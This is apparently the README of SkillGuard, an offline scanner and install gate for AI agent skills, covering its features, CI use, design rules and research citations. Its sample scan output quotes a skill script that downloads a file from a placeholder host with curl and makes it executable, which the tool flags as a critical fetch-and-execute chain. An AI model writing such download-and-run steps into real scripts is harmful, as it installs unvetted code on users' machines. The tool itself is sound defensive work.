# SkillGuard

> **A local-first package manager and supply-chain security layer for AI Agent Skills.**
> npm-style package management for Agent Skills — with a trust gate before install.

[![License](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)
[![Rust](https://img.shields.io/badge/rust-stable-orange.svg)](https://www.rust-lang.org/)
[![CI](https://github.com/lxbworld/SkillGuard/actions/workflows/ci.yml/badge.svg)](https://github.com/lxbworld/SkillGuard/actions/workflows/ci.yml)

---

## Naming, and what we cite

This project keeps the name **SkillGuard** deliberately, and credits the academic
work that shares it. Two papers independently use the name:

- **arXiv:2606.03024 — "SkillGuard: A Permission Framework for Agent Skills"**
  Proposes a *runtime* permission framework: a permission taxonomy, a baseline
  policy, a session-state document, and sandbox-based enforcement, with an LLM
  generating manifests (91.0% F1 at capability level, measured on 315 real skills).
- **arXiv:2605.10990 — "Skill Drift Is Contract Violation"**
  A separate research system that also goes by SkillGuard, monitoring
  environment-contract drift in skill libraries.

**SkillGuard is not affiliated with, endorsed by, or an official implementation of
either work. No code from either is used here.** We implement an independent,
*pre-install*, **fully deterministic** subset of the permission-manifest idea — no
LLM, no sandbox, no runtime enforcement.

| | arXiv:2606.03024 | This project |
|---|---|---|
| Enforcement point | runtime | before install |
| Manifest generation | LLM-assisted | deterministic derivation |
| Sandbox | required | none — scanner never executes what it scans |
| Environment | model in the loop | fully offline |
| Scope | permission taxonomy for mediation | verification, policy gating, lockfile |

If you are citing the permission-manifest line of work, please cite both, so the
distinction stays legible.

Further work this project builds on, and cites:

- **arXiv:2605.11418** — metadata-only skill registry poisoning (86% pairwise win rate)
- **arXiv:2608.10906** — GitSkills: 3,797,117 skill files across 282,200 repositories
- **USENIX Security 2026** — "Do Not Mention This to the User: Detecting and
  Understanding Malicious Agent Skills in the Wild"
- **skills-lock/skil-lock** (Apache-2.0) — capability lockfile problem space
- **vercel-labs/skills** (MIT) — the `skills-lock.json` format we can import

See [NOTICE](NOTICE) for full attribution terms.

---

## Why

An Agent Skill is no longer just Markdown:

```text
SKILL.md + scripts/ + dependencies + external URLs + package-manager commands + permissions
```

It can touch your filesystem, shell, network, secrets and credentials — running
with your full user privileges. That is a software supply-chain attack surface
with a package-manager-shaped hole in it.

What you should be able to ask before installing anything:

```text
What exactly am I installing?
What can it access?
Where did it come from?
Did it change?
Am I allowed to install it?
Can I reproduce the same installation?
```

Nobody answers all six with one tool.

## The difference

Existing tools each cover one slice:

| | scan | policy block | lockfile | **declared vs observed** | offline | install |
|---|---|---|---|---|---|---|
| Snyk Agent Scan | ✅ | ❌ | ❌ | ❌ | ❌ (cloud LLM) | ❌ |
| skillmds | ✅ | ❌ | ✅ | ❌ | ✅ | ✅ |
| skill-preflight | ✅ | ✅ | ❌ | ❌ | ✅ | ❌ |
| skil-lock | ✅ | ✅ | ✅ | ❌ | ✅ | ❌ |
| skills (vercel-labs) | ❌ | ❌ | ✅ | ❌ | ✅ | ✅ |
| **SkillGuard** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |

The one empty cell: **nobody verifies a Skill's declared permissions against
its actual behaviour.** That is where this project lives.

## Status

Research and architecture complete. **Phases 1–4 are implemented**: 52 rules,
declared-vs-observed verification, policy engine, content-addressed lockfile,
CI on three platforms, a GitHub Action, a pre-commit hook and prebuilt-binary
releases. The Phase 0 corpus pipeline (`corpus index|scan|stats|report|reproduce`)
is implemented and offline; the study itself is blocked on registry collection
permission, not on code.

Test suite and CI are green; `cargo fmt`, `cargo clippy -D warnings` and
`cargo deny check` are clean, on every platform in the matrix.

**Where to pick up work: see the [issue board](https://github.com/lxbworld/SkillGuard/issues).**
Issue #1 is the next major milestone — the corpus study needs a corpus, which
needs the collection clearances tracked at #5; the pipeline that consumes it is
done.

- [Phase 0 Corpus Study](docs/PHASE0_CORPUS_STUDY.md) — the plan to produce the
  first large-scale empirical measurement of the skill ecosystem.
- [**Feasibility, Direction & GTM**](docs/VIABILITY.md) — **read this first.**
  Market data, why "package manager" is the wrong framing, and the phased plan.
- [Competitive Analysis](docs/COMPETITIVE_ANALYSIS.md) — 13 projects surveyed
- [Architecture](docs/ARCHITECTURE.md) — crate layout, data flow, invariants
- [Threat Model](docs/THREAT_MODEL.md) — T1–T17, including attacks on the scanner
- [Rule reference](docs/RULES.md) — every rule, generated from the code
- [Corpus report](docs/CORPUS_REPORT.md) — the Phase 0 report (awaiting a corpus)
- [MVP Roadmap](docs/MVP.md) — phased scope with exit criteria
- [`research/DISCLOSURE.md`](research/DISCLOSURE.md) — the disclosure protocol and
  the registry permission requests

## Install

```bash
cargo install --path .          # from a clone
```

Requires Rust 1.78+. Git is needed only to establish a skill's provenance (its
commit SHA); every other check works on a directory that is not a repository.

## Use

```bash
skillguard scan ./my-skill              # evidence-grade report
skillguard scan --format sarif ./skills # for GitHub Code Scanning
skillguard scan --fail-on high .        # CI gate
skillguard inspect ./my-skill           # capabilities only, no judgement
skillguard diff ./my-skill              # declared permissions vs observed behaviour
skillguard adopt --dry-run ./my-skill   # derive a declaration from observation
skillguard policy-check ./my-skill      # evaluate SKILLGUARD.policy.yaml
skillguard lock ./my-skill              # write SKILLGUARD.lock
skillguard verify ./my-skill            # recompute source + commit + digest
skillguard import skills-lock.json      # read a foreign lockfile
skillguard rules                        # the rule catalogue
skillguard rules --format markdown      # the catalogue as docs/RULES.md
skillguard inspect --labeling ./skill   # normalized text only, for GOLD labelling
skillguard corpus index ./checkout --out corpus-manifest.jsonl
skillguard corpus scan --manifest corpus-manifest.jsonl --tree ./checkout \
                       --out raw-findings.jsonl
skillguard corpus stats --findings raw-findings.jsonl
skillguard corpus report --findings raw-findings.jsonl --out docs/CORPUS_REPORT.md
skillguard corpus report --findings raw-findings.jsonl --gold research/gold/GOLD-v1.jsonl \
                        --out docs/CORPUS_REPORT.md   # with precision/recall (G4)
skillguard corpus reproduce --manifest corpus-manifest.jsonl --tree ./checkout
```

Exit codes: `0` clean · `1` findings at/above `--fail-on` · `2` integrity · `3` usage.

### Use in CI

The scan is offline and deterministic, so it drops into an existing pipeline
without an account or a network call:

```yaml
# GitHub Actions
permissions:
  contents: read
  security-events: write   # required for the SARIF upload
steps:
  - uses: actions/checkout@v4
  - uses: lxbworld/SkillGuard/action@v0.1.0
    with:
      path: .
      fail-on: high
```

```yaml
# .pre-commit-config.yaml — one line to adopt
repos:
  - repo: https://github.com/lxbworld/SkillGuard
    rev: v0.1.0
    hooks:
      - id: skillguard
```

The Action emits SARIF, uploads it to Code Scanning, and only then fails the
job, so a finding is visible for the commit that needed it. Prebuilt binaries
for five platforms are published with a `sha256` that the installer verifies
before running anything. The Action adds no telemetry; nothing about your skills
leaves the runner.

### What a finding looks like

```text
  download-execute
    Sets up the workspace quickly.
    14 finding(s): 2 critical, 5 high, 4 medium, 3 low, 0 info

    observed capabilities (from executable files only)
      network: get.workspace-tools.example.net
      shell: bash, chmod, crontab, curl, sudo
      fs read: /tmp/ws-installer

    CRITICAL  scripts/setup.sh:5  [DL_CHAIN_FETCH_EXECUTE]
      fetch -> execute chain: content is downloaded, made runnable, then run
          5 | curl -sSL https://get.workspace-tools.example.net/install -o /tmp/ws-installer
             -> fetch
          6 | chmod +x /tmp/ws-installer
             -> execute sink
      capability: shell.execute
```

Every finding carries a file, a line, and the original text. No evidence, no
finding.

## Design constraints

1. **Zero LLM in the core.** Every verdict is deterministic — regex, SHA256,
   SPDX-aware license comparison, git. No model is called, ever.
2. **Fully offline.** Scanning uploads nothing anywhere.
3. **The scanner never executes what it scans.** No `npm install`, no
   subprocess on scanned files, no network. The scanned skill is hostile input,
   and the scanner is built to survive that: symlink escapes, path traversal,
   parser bombs, terminal-injection and lockfile poisoning are all handled
   explicitly ([docs/THREAT_MODEL.md](docs/THREAT_MODEL.md) T11–T17).
4. **Evidence, not verdicts.** Documentation that merely *mentions* `~/.ssh` is
   reported at low confidence; the same string in `scripts/` is a finding. That
   distinction is what makes the tool usable on real skills.
5. **Single Rust binary.** No Node, no Python, no runtime dependencies in CI.

## Where the ecosystem actually stands

| | |
|---|---|
| 606,555 | tools across 55 directories (Sep 2026), +1,551/day |
| 3,797,117 | skill files in 282,200 GitHub repos, **50.5% duplicated** |
| 341 / 2,857 | **11.9% of ClawHub skills were malicious** (Koi Security, Feb 2026) |
| 1,184+ | poisoned skills distributing Atomic Stealer, Feb–May 2026 |
| 5 of top 7 | most-downloaded skills confirmed as malware (CSA, 2026-05) |

| Phase | Scope | Status |
|---|---|---|
| **0** | 100k-skill corpus study, public dataset, benchmark | pipeline **done**; collection blocked on [#5](https://github.com/lxbworld/SkillGuard/issues/5) — [#1](https://github.com/lxbworld/SkillGuard/issues/1) |
| 1 | Parser, finding model, scanner | **done** |
| 2 | Capability model, declared vs observed | **done** |
| 3 | Policy engine, approval lockfile | **done** |
| 4 | CI / SARIF / GitHub Action / rule registry | **done** — [#4](https://github.com/lxbworld/SkillGuard/issues/4), [#6](https://github.com/lxbworld/SkillGuard/issues/6) |
| 5 | `add` / `install` — **optional**, only on demonstrated demand | deferred — [#9](https://github.com/lxbworld/SkillGuard/issues/9) |

Distribution for Phase 4 lives in `action/` (composite GitHub Action),
`.pre-commit-hooks.yaml` (pre-commit hook) and `.github/workflows/release.yml`
(prebuilt binaries with a published `sha256` for each). `docs/RULES.md` is
generated from the code and checked for drift in CI.

## Roadmap (deliberately not doing)

No web registry. No SaaS. No agent runtime. No autonomous security agent.
No enterprise MDM. No self-trained models. No MCP ecosystem scanning.
See [docs/MVP.md §8](docs/MVP.md) for the reasoning.

## License

Apache-2.0. Commercial use, modification and private redistribution are all
permitted without royalty.

Redistributions must visibly acknowledge: **"Built with SkillGuard —
https://github.com/lxbworld/SkillGuard"**. Full terms in [NOTICE](NOTICE).

```text
Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at http://www.apache.org/licenses/LICENSE-2.0
Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
```

## Requirements

Rust 1.78+ (stable). Git, only when a skill's provenance needs a commit SHA.

## Contributing

Every new security rule ships with a regression test and a fixture.
Rules must be deterministic and evidence-bearing. See
[docs/MVP.md §3](docs/MVP.md) for the rule ID catalogue and acceptance criteria.